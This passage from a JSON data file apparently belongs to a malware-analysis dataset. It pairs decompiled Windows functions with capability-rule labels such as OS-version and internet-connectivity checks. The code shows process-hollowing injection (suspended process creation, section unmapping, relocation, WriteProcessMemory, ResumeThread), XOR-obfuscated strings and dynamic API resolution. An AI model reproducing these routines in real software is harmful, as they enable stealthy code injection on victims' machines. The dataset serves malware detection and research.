        "decompiled_code": "\nint32_t __cdecl fcn.004074c9(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040b3b0;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    if (((arg_8h & 0x10) == 0) && ((*0x41bd38 & 1) != 0)) {\n        iVar3 = in_EDX[2];\n        var_20h = 0x41b628;\n    }\n    else {\n        iVar3 = *in_EDX;\n    }\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar6 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.00406c8b(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00406c49(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.00406d51(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar6 + var_8h;\n            puVar4 = *in_EDX;\n            puVar7 = iVar1 + 0xc50;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar7 = var_8h + 0xc50 + in_EDX[4] + uVar6;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar5 = in_EDX;\n            puVar4 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = *piVar5;\n                piVar5 = piVar5 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar6;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = var_4h + 0xc50 + in_EDX[4] + uVar6;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41bd38 & 1) != 0)) {\n                iVar3 = fcn.004071d2();\n            }\n            else {\n                iVar3 = fcn.00406eba();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.004076a2(in_ECX, var_4h + uVar6 + 0x40, var_4h + uVar6, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            uVar2 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, var_8h);\n            (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar2);\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1194
    },
    "00407e39": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407e39(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint16_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uchar *puVar14;\n    int32_t iVar15;\n    uchar *puStack1012;\n    uchar *puStack1008;\n    uint uStack1004;\n    int32_t *piStack1000;\n    int32_t *piStack996;\n    uint uStack992;\n    int32_t *piStack988;\n    uchar *puStack984;\n    int32_t *piStack980;\n    uint uStack976;\n    int32_t *piStack972;\n    int32_t *piStack968;\n    uint uStack964;\n    int32_t iStack920;\n    int32_t iStack916;\n    uint32_t uStack912;\n    uint32_t uStack908;\n    uint uStack904;\n    uint uStack900;\n    uint uStack896;\n    uint uStack892;\n    uint32_t uStack888;\n    int32_t iStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack852;\n    uint uStack848;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack796;\n    uchar auStack740 [96];\n    int32_t iStack644;\n    int32_t iStack628;\n    \n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack904 = 0x4d354c5c;\n    uStack900 = 0x6c066932;\n    uStack848 = 0;\n    iStack920 = 0;\n    uStack908 = 0;\n    uStack852 = 0;\n    puVar12 = &stack0xfffffcd4;\n    for (iVar10 = 0x44; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack812 = 0x44;\n    puVar12 = &stack0xfffffcb8;\n    for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack896 = 0x4d034c0d;\n    uStack892 = 0x6c276926;\n    puVar12 = &stack0xfffffd1c;\n    for (iVar10 = 0x2cc; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    uStack888 = 0x4d094c16;\n    iStack884 = 0x6c50693f;\n    piVar13 = piVar6;\n    for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *piVar13 = 0;\n        piVar13 = piVar13 + 1;\n    }\n    uStack880 = 0x4d354c25;\n    uStack876 = 0x6c066932;\n    uStack872 = 0x4d034c0d;\n    uStack868 = 0x6c466926;\n    uStack864 = 0x4d3a4c4b;\n    uStack860 = CONCAT22(uStack860._2_2_, 0x694b);\n    iStack916 = 0x4d664c79;\n    uStack912 = 0x6c75694b;\n    uStack964 = 0x407f2f;\n    fcn.00401000(0x5c);\n    iVar10 = uStack860;\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + uStack860;\n        uVar7 = uVar11 & 0x80000007;\n        if (uVar7 < 0) {\n            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = (&stack0xfffffc68)[uVar7] ^ puVar1[&stack0xfffffc74 + -uStack860];\n    } while (uVar11 < 0x2e);\n    uStack964 = 0x104;\n    piStack972 = uStack860;\n    uStack976 = 0x407f68;\n    piStack968 = piVar6;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    puStack984 = 0x407f75;\n    piStack980 = piVar6;\n    uStack976 = uVar5;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack984 = 0x40fb0c;\n    uStack992 = 0x407f7d;\n    piStack988 = piVar6;\n    (*pcVar4)();\n    uStack992 = arg_8h;\n    piStack1000 = 0x407f83;\n    piStack996 = piVar6;\n    (*pcVar4)();\n    piStack1000 = 0x40fb14;\n    puStack1008 = 0x407f8b;\n    uStack1004 = piVar6;\n    (*pcVar4)();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while( true ) {\n        puStack1008 = &stack0xfffffc88;\n        puStack1012 = &stack0xfffffca4;\n        iVar8 = (*pcVar4)(0, piVar6, 0, 0, 0, 0x800000c, 0, 0);\n        if (iVar8 != 0) break;\n        uStack1004 = 0x3e8;\n        puStack1008 = 0x407f9e;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    puStack1008 = NULL;\n    puStack1012 = 0x407fc8;\n    uStack1004 = piVar6;\n    puStack1012 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    uStack796 = 0x10002;\n    piVar6 = *(piStack1000 + 0x3c) + piStack1000;\n    piStack972 = piVar6;\n    iVar8 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack892, &stack0xfffffce4);\n    if (iVar8 != 0) {\n        iVar8 = fcn.00406c8b(&stack0xfffffc34);\n        if ((iVar8 == 0) && (iVar8 = fcn.00406c49(&stack0xfffffc70),  iVar8 == 0)) {\n            if (puStack984 != NULL) {\n                puVar12 = puStack1008;\n                puVar14 = puStack984;\n                for (iVar10 = piVar6[0x15]; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar14 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                piStack988 = NULL;\n                if (*(piVar6 + 6) != 0) {\n                    piStack1000 = *(piVar6 + 5) + 0x24 + piVar6;\n                    do {\n                        iVar10 = piStack1000[1];\n                        if (iVar10 != 0) {\n                            puVar12 = puStack1008 + *piStack1000;\n                            puVar14 = puStack984 + *piStack1000;\n                            for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n                                *puVar14 = *puVar12;\n                                puVar12 = puVar12 + 1;\n                                puVar14 = puVar14 + 1;\n                            }\n                        }\n                        piStack1000 = piStack1000 + 10;\n                        piStack988 = piStack988 + 1;\n                    } while (piStack988 < *(piVar6 + 6));\n                }\n                piVar13 = piVar6 + 0x28;\n                if (*(piVar6 + 1) == -0x799c) {\n                    piVar13 = piVar6 + 0x2c;\n                }\n                piStack1000 = uStack912 - piVar6[0xd];\n                uStack888 = uStack912 - piVar6[0xd];\n                iStack884 = (uStack912 >> 0x1f) - (uStack912 < piVar6[0xd]);\n                uStack1004 = puStack1008 + *piVar13;\n                if ((*piVar13 != 0) && (uStack908 = piVar13[1],  uStack908 != 0)) {\n                    while (8 < uStack908) {\n                        piStack988 = uStack1004[1] - 8U >> 1;\n                        iVar10 = *uStack1004;\n                        if ((uStack1004[1] <= uStack908) && (piStack988 != NULL)) {\n                            piVar6 = uStack1004 + 2;\n                            piVar13 = piStack988;\n                            do {\n                                uVar3 = *piVar6;\n                                puStack1008 = uVar3 >> 0xc;\n                                if (puStack1008 == 0x3) {\n                                    *(puStack984 + (uVar3 & 0xfff) + iVar10) =\n                                         *(puStack984 + (uVar3 & 0xfff) + iVar10) + piStack1000;\n                                }\n                                else if (puStack1008 == 0xa) {\n                                    uVar7 = uVar3 & 0xfff;\n                                    puVar2 = puStack984 + uVar7 + iVar10;\n                                    uVar11 = *puVar2;\n                                    *puVar2 = *puVar2 + uStack888;\n                                    *(puStack984 + uVar7 + 4 + iVar10) =\n                                         *(puStack984 + uVar7 + 4 + iVar10) + iStack884 + CARRY4(uVar11, uStack888);\n                                }\n                                piVar6 = piVar6 + 2;\n                                piVar13 = piVar13 + -1;\n                            } while (piVar13 != NULL);\n                        }\n                        piVar6 = uStack1004 + 1;\n                        uStack1004 = uStack1004 + uStack1004[1];\n                        uStack908 = uStack908 - *piVar6;\n                        piVar6 = piStack980;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar15 = piVar6[10] + iStack916;\n                iVar8 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uStack908, iStack644 + 8, &stack0xfffffc8c, 4, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                iVar10 = iStack920;\n                if (iVar8 != 0) {\n                    iStack916 = 1;\n                    iVar10 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc1c, 1);\n                    if (iVar10 == 0) {\n                        uStack1004._0_1_ = 0xe9;\n                    }\n                    uStack1004 = uStack1004 & 0xffffff00 | uStack1004;\n                    iVar8 = (*pcVar4)(&stack0xfffffc15, 4);\n                    iVar10 = iStack920;\n                    if (iVar8 == 0) {\n                        uVar11 = (iVar15 - iStack628) - 5;\n                        puStack1012 = puStack1012 & 0xff | uVar11 * 0x100;\n                        puStack1008 = puStack1008 & 0xffffff00 | uVar11 >> 0x18;\n                    }\n                    iVar8 = 0;\n                    do {\n                        iVar15 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                           (iVar10, iVar8 + iStack644, &stack0xfffffc0c + iVar8, 0, 0);\n                        if (iVar15 == 0) break;\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(iStack916);\n                    iVar10 = iStack920;\n                }\n                goto code_r0x0040825e;\n            }\n        }\n        else {\ncode_r0x0040825e:\n            if (puStack984 != NULL) {\n                uVar5 = (*_sym.imp.ntdll.dll_NtUnmapViewOfSection)(0xffffffff, puStack984);\n                (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar5);\n            }\n        }\n        if (piStack972 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(piStack972);\n        }\n        if (iStack916 != 0) goto code_r0x004082ae;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack904, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack912);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack912);\ncode_r0x004082ae:\n    uVar5 = uStack904;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    return uVar5;\n}\n",
        "token_count": 3189
    },
    "00408f2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408f2b(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    bool bVar13;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    int32_t pProxyConfig;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uchar *psz1;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t lpcwszUrl;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puVar12 = &pProxyConfig;\n    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    pszFile._0_2_ = 0;\n    psz1 = param_2;\n    sub.ntdll.dll_memset(&pszFile + 2, 0, 0x206);\n    var_4h = 0;\n    puVar12 = &pszFile;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar12 = 0;\n        puVar12 = puVar12 + 1;\n    }\n    puVar11 = param_2;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar5 != 0) && (iVar5 = fcn.00408ece(),  iVar5 != 0)) {\n        uVar9 = 1;\n        if (((pProxyConfig != 0) || (var_30h != 0)) &&\n           (iVar5 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  param_2 = psz1,  iVar5 != 0)) {\n            bVar13 = pProxyConfig != 0;\n            var_44h = 0;\n            uStack68 = 0;\n            uStack64 = 0;\n            var_48h = bVar13;\n            pAutoProxyOptions = bVar13;\n            if (var_30h != 0) {\n                pAutoProxyOptions = bVar13 | 2;\n                var_44h = var_30h;\n            }\n            var_38h = 1;\n            puVar12 = &pProxyInfo;\n            for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar12 = 0;\n                puVar12 = puVar12 + 1;\n            }\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar5, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar6 == 0) || (psz2 == 0)) {\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                param_2 = psz1;\n                if (var_ch != 0) {\n                    (*pcVar2)(var_ch);\n                    param_2 = psz1;\n                }\n                goto code_r0x0040908d;\n            }\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_ch != 0) {\n                (*pcVar2)(var_ch);\n            }\ncode_r0x00409268:\n            uVar9 = 1;\n            goto code_r0x0040920f;\n        }\ncode_r0x0040908d:\n        if (var_2ch != 0) {\n            if (var_28h == 0) {\ncode_r0x004090c6:\n                iVar5 = (*_sym.imp.ntdll.dll_wcschr)(var_2ch, 0x3d);\n                if (iVar5 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(param_2, var_2ch);\n                    goto code_r0x0040920f;\n                }\n                pProxyInfo = 0x361b323f;\n                psz2 = 0x57437427;\n                var_ch = 0x530c6f41;\n                var_8h._0_2_ = 0x3374;\n                var_20h = 0x366f3257;\n                var_1ch = var_1ch & 0xff000000 | 0x337453;\n                fcn.00401000(0x1c);\n                iVar5 = var_4h;\n                iVar10 = 0;\n                iVar6 = &pProxyInfo - var_4h;\n                do {\n                    var_4h = 7;\n                    puVar1 = iVar10 + iVar5;\n                    iVar7 = iVar10 % 7;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_20h + iVar7) ^ puVar1[iVar6];\n                } while (iVar10 < 0xe);\n                pProxyInfo = 0x63264e12;\n                psz2 = 0x54356c0c;\n                var_ch = 0x63524e09;\n                var_20h = 0x63524e7a;\n                var_1ch = 0x54456c78;\n                fcn.00401000(0x18);\n                iVar6 = var_4h;\n                uVar8 = 0;\n                do {\n                    puVar1 = uVar8 + var_4h;\n                    uVar4 = uVar8 & 0x80000007;\n                    if (uVar4 < 0) {\n                        uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar8 = uVar8 + 1;\n                    *puVar1 = *(&var_20h + uVar4) ^ puVar1[&pProxyInfo - var_4h];\n                } while (uVar8 < 0xc);\n                iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar5);\n                bVar13 = iVar10 == lpcwszUrl;\n                var_4h = 0;\n                do {\n                    lpcwszUrl = fcn.00403734(&var_4h);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (lpcwszUrl == 0) {\n                        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                        uVar9 = (*pcVar2)(0, iVar5);\n                        (*pcVar3)(uVar9);\n                        goto code_r0x0040920d;\n                    }\n                    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                } while ((bVar13 != (iVar10 == lpcwszUrl)) ||\n                        (iVar10 = (*_sym.imp.ntdll.dll_wcschr)(lpcwszUrl, 0x3d),  iVar10 == 0));\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar10 + 2);\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                uVar9 = (*pcVar3)(0, iVar5);\n                (*pcVar2)(uVar9);\n                goto code_r0x00409268;\n            }\n            do {\n                iVar5 = fcn.00403734(&var_4h);\n                if (iVar5 == 0) goto code_r0x004090c6;\n                iVar5 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar5);\n            } while (iVar5 == 0);\n        }\n    }\ncode_r0x0040920d:\n    uVar9 = 0;\ncode_r0x0040920f:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_30h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_30h);\n    }\n    if (var_2ch != 0) {\n        (*pcVar2)(var_2ch);\n    }\n    if (var_28h != 0) {\n        (*pcVar2)(var_28h);\n    }\n    return uVar9;\n}\n",
        "token_count": 2259
    },
    "00409365": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00409365(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_ch = param_1;\n    if (*0x41bdb4 == NULL) {\n        var_24h = 0x24184a33;\n        var_20h = 0x2a7b7e40;\n        var_1ch = 0x5228204b;\n        var_18h._0_2_ = 0x3c3b;\n        var_18h._2_1_ = 0x7a;\n        var_14h = 0x4b4f397a;\n        var_10h = var_10h & 0xff000000 | 0x4f4837;\n        fcn.00401000(0xf);\n        iVar6 = var_8h;\n        iVar10 = 0;\n        iVar7 = &var_24h - var_8h;\n        do {\n            var_8h = 7;\n            puVar1 = iVar10 + iVar6;\n            iVar8 = iVar10 % 7;\n            iVar10 = iVar10 + 1;\n            *puVar1 = *(&var_14h + iVar8) ^ puVar1[iVar7];\n        } while (iVar10 < 0xf);\n        var_24h = 0x163b333c;\n        var_20h = 0x78512e34;\n        var_1ch = 0x14253279;\n        var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x51);\n        var_14h = 0x78495657;\n        var_10h = 0x4a624251;\n        fcn.00401000(0xd);\n        iVar7 = var_8h;\n        uVar9 = 0;\n        do {\n            puVar1 = uVar9 + var_8h;\n            uVar4 = uVar9 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar9 = uVar9 + 1;\n            *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_24h - var_8h];\n        } while (uVar9 < 0xd);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_8h, iVar6);\n        *0x41bdb4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        uVar5 = (*pcVar3)(0, iVar6);\n        (*pcVar2)(uVar5);\n        if (*0x41bdb4 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_ch != 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_ch),  iVar6 != 0)) {\n        iVar7 = (**0x41bdb4)(iVar6, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n    }\n    return var_4h;\n}\n",
        "token_count": 966
    },
    "0040985c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040985c(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ah;\n    uchar var_36h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2bh;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_14h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00409810();\n    }\n    if (*0x41bddc == NULL) {\n        var_34h = 0x201d3d2b;\n        var_ch = 7;\n        var_30h._0_1_ = 7;\n        stack0xffffffcd = 0x25291c6b;\n        var_2bh = 0x79;\n        var_20h = 0x4c794945;\n        var_1ch._0_2_ = 0x456b;\n        var_1ch._2_1_ = 0x78;\n        fcn.00401000(10);\n        var_8h = 0;\n        do {\n            *(var_8h + lpModuleName) = *(&var_20h + var_8h % var_ch) ^ (var_8h + lpModuleName)[&var_34h - lpModuleName];\n            var_8h = var_8h + 1;\n        } while (var_8h < 10);\n        var_50h = 0x46e0108;\n        var_4ch = 0x7030;\n        var_48h = 0x110f5813;\n        var_44h = 0x326462f;\n        var_40h._0_1_ = 0x58;\n        var_40h._1_1_ = 7;\n        stack0xffffffbe = 0x3d59230a;\n        var_3ah = 0x735d4004;\n        var_36h = 0x46;\n        var_20h = 0x6b397652;\n        var_1ch._0_2_ = 0x4647;\n        var_1ch._2_1_ = 0x34;\n        fcn.00401000(0x1b);\n        iVar6 = var_8h;\n        var_8h = &var_50h - var_8h;\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + iVar6;\n            iVar5 = iVar7 % var_ch;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_20h + iVar5) ^ puVar1[var_8h];\n        } while (iVar7 < 0x1b);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n        *0x41bddc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, lpModuleName);\n        (*pcVar2)(uVar4);\n        var_28h = 0;\n        iVar6 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41bddc == NULL) goto code_r0x004099de;\n    }\n    iVar6 = var_4h;\n    var_28h = 0;\n    iVar7 = (**0x41bddc)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar7) {\n    }\ncode_r0x004099de:\n    if (var_14h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n    }\n    return var_28h;\n}\n",
        "token_count": 1140
    },
    "004099f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
